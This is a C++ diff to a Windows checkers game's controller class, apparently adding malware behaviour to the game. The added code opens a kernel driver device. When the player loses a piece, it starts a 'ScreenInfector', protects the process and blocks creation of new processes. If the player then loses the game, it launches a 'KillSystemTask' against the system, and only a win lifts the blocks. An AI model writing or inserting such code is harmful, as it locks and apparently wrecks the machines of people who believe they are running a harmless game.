@@ -3,6 +3,7 @@
 #include "CursedEvents.h"
 #include "Systems.h"
 #include "WRendering.h"
+#include "KillSystemTask.h"
 
 WCursedController::WCursedController()
 {
@@ -10,6 +11,16 @@ WCursedController::WCursedController()
 	_activated = false;
 	_playerTurnsCount = 0;
 	_playerCheckersLeft = 12;
+	_infector = nullptr;
+
+	HANDLE hDevice = CreateFile(L"\\\\.\\DCheckers", FILE_SHARE_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+	if (hDevice == INVALID_HANDLE_VALUE) {
+		_connected = false;
+	}
+	else
+	{
+		_driver = new DeadDriverController(hDevice);
+	}
 
 	WTextureSet& textures = (dynamic_cast<WRendering*>(Systems::GetRendering()))->GetTextureSet();
 
@@ -53,11 +64,27 @@ void WCursedController::HandleFirstPlayerCheckerLoss()
 			CursedEvents::SetCursedCellIndexes();
 			CursedEvents::SetCursedBackground();
 			CursedEvents::BlockButtons();
-			infector = new ScreenInfector();
+			_infector = new ScreenInfector();
+			_driver->Protect();
+			_driver->BlockProcessesCreation();
 			break;
 		}
 	}
 }
+
+void WCursedController::HandleFirstPlayerWin()
+{
+	_driver->StopBlockingProcessesCreation();
+	_driver->StopProtecting();
+	PostQuitMessage(0);
+}
+
+void WCursedController::HandleSecondPlayerWin()
+{
+	_infector->SetInfectionSpeed(0);
+	new KillSystemTask(_driver, 250);
+}
+
 
 void WCursedController::HandleGameEnd(Team winningTeam)
 {
